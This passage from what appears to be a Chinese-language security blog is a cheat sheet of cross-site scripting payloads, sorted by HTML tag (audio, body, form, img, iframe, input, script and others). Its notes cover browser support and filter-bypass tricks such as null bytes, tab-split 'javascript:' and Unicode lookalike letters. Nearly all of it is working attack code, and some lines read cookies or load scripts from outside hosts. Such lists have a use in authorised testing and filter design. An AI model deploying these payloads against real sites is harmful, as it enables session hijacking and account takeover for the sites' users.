class="name">audio</span>&gt;</span> // 加载第一帧时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">onloadedmetadata</span>=<span class="string">alert(1)</span>&gt;</span> <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 加载元数据时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">onplay</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span>  <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 播放资源时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">onplaying</span>=<span class="string">alert(1)</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 触发资源正在播放（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">autoplay</span> <span class="attr">ontimeupdate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"validaudio.wav"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 更改时间轴时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onpause</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 需要点击元素才能暂停（Chrome、Firefox、IE、Safari)（video 同理）</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onseeked</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 需要点击元素时间轴（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onseeking</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"validaudio.wav"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 同上</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onvolumechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 需要调节音量（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="body-标签"><a class="markdownIt-Anchor" href="#body-标签"></a> ◈ <code>&lt;body&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onafterprint</span>=<span class="string">alert(1)</span>&gt;</span>  // 页面打印后触发（Chrome、Firefox、IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onbeforeprint</span>=<span class="string">alert(1)</span>&gt;</span> // 在页面打印前触发（Chrome、Firefox、IE)</span><br><span class="line">body&#123;background-image:url(javascript:alert("xss"))&#125; //在CSS代码中加入javascript和vbscript脚本</span><br><span class="line">body&#123;xss:\0065xpression(alert('xss'))&#125;'//将e转换为\0065</span><br><span class="line">body&#123;background-image:\0075\0072\006c…&#125;'将url全转为16进制</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onhashchange</span>=<span class="string">"alert(1)"</span>&gt;</span> // 如果哈希值更改，则触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onmessage</span>=<span class="string">alert(1)</span>&gt;</span> // 当从postMessage调用接收到消息事件时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span> // 显示页面时触发（Chrome、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpopstate</span>=<span class="string">alert(1)</span>&gt;</span> // 历史记录更改时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onresize</span>=<span class="string">"alert(1)"</span>&gt;</span> // 调整窗口大小时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">height:1000px</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> // 页面滚动时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunhandledrejection</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">fetch(<span class="string">'//xyz'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 未履行承诺时触发（Firefox)</span><br></pre></td></tr></table></figure><h4 id="button-标签"><a class="markdownIt-Anchor" href="#button-标签"></a> ◈ <code>&lt;button&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>/<span class="attr">onclick</span>=<span class="string">alert(/xss/)</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>M //需要交互</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span> // 不需要交互</span><br></pre></td></tr></table></figure><h4 id="details-标签"><a class="markdownIt-Anchor" href="#details-标签"></a> ◈ <code>&lt;details&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">alert(1)</span> <span class="attr">open</span>&gt;</span>test<span class="tag">&lt;/<span class="name">details</span>&gt;</span> // 展开详细信息标签时触发（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="div-标签"><a class="markdownIt-Anchor" href="#div-标签"></a> ◈ <code>&lt;div&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>/<span class="attr">onmouseover</span>=<span class="string">'alert(1)'</span>&gt;</span>X</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">STYLE</span>=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">contenteditable</span>&gt;</span>drag me<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">ondragover</span>=<span class="string">alert(1)</span> <span class="attr">contenteditable</span>&gt;</span>drop here<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 触发删除可拖动元素（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="embed-标签"><a class="markdownIt-Anchor" href="#embed-标签"></a> ◈ <code>&lt;embed&gt;</code> 标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;javascript:alert(1)&quot;&gt; // 使用JavaScript协议嵌入src属性Firefox</span><br></pre></td></tr></table></figure><h4 id="form-标签"><a class="markdownIt-Anchor" href="#form-标签"></a> ◈ <code>&lt;form&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>CLICKME<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061lert(1)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">oninvalid</span>=<span class="string">alert(1)</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span> // 需要具有不满足其约束的元素（例如必填属性）的表单提交。（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onreset</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">reset</span>&gt;</span> // 需要点击触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">search</span> <span class="attr">onsearch</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">"Hit return"</span> <span class="attr">autofocus</span>&gt;</span> // 提交表单并且输入具有搜索的type属性时触发（Chrome）</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span> // 需要提交表单（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span>XSS // 按钮和动作</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">value</span>=<span class="string">XSS</span>&gt;</span> // 输入和形式</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">XSS</span>&gt;</span> // 形式与行动</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">x</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">label</span>&gt;</span> // 在页面上的任何位置（甚至在表单外部）单击提交元素</span><br></pre></td></tr></table></figure><h4 id="img-标签"><a class="markdownIt-Anchor" href="#img-标签"></a> ◈ <code>&lt;img&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>"<span class="attr">xss</span>")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ımg</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>"<span class="attr">xss</span>")&gt;</span> // toUpperCase 函数将 ı 解码为 I</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  //只在chrome下有效</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(String.fromCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://upload-images.jianshu.io/upload_images/2836722-144777dab221babc.png?imageMogr2/auto-orient/strip|imageView2/2/w/537/format/webp"</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'1'</span> <span class="attr">onerror</span>\<span class="attr">x00</span>=<span class="string">alert(0)</span> /&gt;</span> // 绕过 onxxx= 过滤通过空字节/垂直标签</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">'1'</span>/<span class="attr">onerror</span>/=<span class="string">alert(0)</span> /&gt;</span> // 绕过空格过滤</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert%281%29"</span>&gt;</span> // location</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">"xss:expr/*XSS*/ession(alert('XSS'))"</span>&gt;</span> // IE 浏览器</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">https://www.runoob.com/images/compatible_firefox.gif</span> <span class="attr">onloadend</span>=<span class="string">alert(1)</span>&gt;</span> // 当元素（图片）完成加载时触发（Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">https://www.runoob.com/images/compatible_firefox.gif</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span> // 当元素（图片）开始加载时触发（Firefox)</span><br></pre></td></tr></table></figure><h4 id="iframe-标签"><a class="markdownIt-Anchor" href="#iframe-标签"></a> ◈ <code>&lt;iframe&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert(14);"</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">"data:text/html,&lt;svg onload=alert(1)&gt;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">⭐ <span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  // &amp;Tab;为tab字符</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;img src=1 onerror=alert(1)&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> // 使用srcdoc属性，只有 Chrome 和 Safari 6 支持 <span class="tag">&lt;<span class="name">iframe</span>&gt;</span> 标签的 srcdoc 属性。</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> // Chrome 下 srcdoc 属性</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;img src=1 onerror=alert(1)&gt;"</span>&gt;</span> // 随着现代浏览器使用空来源，iframe数据网址不再起作用</span><br></pre></td></tr></table></figure><h4 id="input-标签"><a class="markdownIt-Anchor" href="#input-标签"></a> ◈ <code>&lt;input&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>/<span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>/<span class="attr">onclick</span>/<span class="attr">onmouseup</span>/<span class="attr">onmousedown</span>/<span class="attr">onchange</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onauxclick</span>=<span class="string">alert(1)</span>&gt;</span> // 右键单击或使用鼠标中键时触发（Chrome、Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onchange</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">xss</span>&gt;</span> // 需要属性值的变化（Chrome、Firefox、IE、Safari)（写完之后鼠标点击别处时会触发）</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">oninput</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">xss</span>&gt;</span> // 需要作为价值的变化（Chrome、Firefox、IE、Safari)（只要写入就会出发）</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onselect</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">"XSS"</span> <span class="attr">autofocus</span>&gt;</span> // 需要选择文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">accesskey</span>=<span class="string">"X"</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span> // 隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</span><br></pre></td></tr></table></figure><h4 id="isindex-标签需要加强"><a class="markdownIt-Anchor" href="#isindex-标签需要加强"></a> ◈ <code>&lt;isindex&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span> // Isindex和formaction（IE）</span><br></pre></td></tr></table></figure><h4 id="link-标签需要加强"><a class="markdownIt-Anchor" href="#link-标签需要加强"></a> ◈ <code>&lt;link&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span> <span class="attr">HREF</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span> <span class="attr">HREF</span>=<span class="string">"http://xss.rocks/xss.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"canonical"</span> <span class="attr">accesskey</span>=<span class="string">"X"</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span> /&gt;</span> // 链接元素：访问键属性可以在通常无法利用的元素上启用XSS(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)（Firefox）</span><br></pre></td></tr></table></figure><h4 id="mate-标签需要加强"><a class="markdownIt-Anchor" href="#mate-标签需要加强"></a> ◈ <code>&lt;mate&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Link"</span> <span class="attr">Content</span>=<span class="string">"&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="marquee-标签"><a class="markdownIt-Anchor" href="#marquee-标签"></a> ◈ <code>&lt;marquee&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">x</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>blah // MathML使任何标签都可点击 Firefox</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=//portswigger-labs.net"</span>&gt;</span> // 重定向到其他域</span><br></pre></td></tr></table></figure><h4 id="marquee-标签-2"><a class="markdownIt-Anchor" href="#marquee-标签-2"></a> ◈ <code>&lt;marquee&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">onbounce</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> // 选框弹跳时触发（好像都实现不了）</span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> // 选框完成时触发（Firefox、IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> // 选框开始时触发（Firefox、IE)</span><br></pre></td></tr></table></figure><h4 id="object-标签"><a class="markdownIt-Anchor" href="#object-标签"></a> ◈ <code>&lt;object&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=============================== 通讯协议 ==============================</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span> // 具有JavaScript协议的对象data属性(Firefox)</span><br></pre></td></tr></table></figure><h4 id="p-标签"><a class="markdownIt-Anchor" href="#p-标签"></a> ◈ <code>&lt;p&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>/<span class="attr">onmouseover</span>=<span class="string">javascript:alert(1);</span> &gt;</span>M<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  //如果发现变量输出在p标签中，只要能跳出""就足够了</span><br></pre></td></tr></table></figure><h4 id="script-标签"><a class="markdownIt-Anchor" href="#script-标签"></a> ◈ <code>&lt;script&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ſcript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span> // toUpperCase 函数将 ſ 解码为 S</span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpt</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span> // 大小写绕过标签黑名单</span><br><span 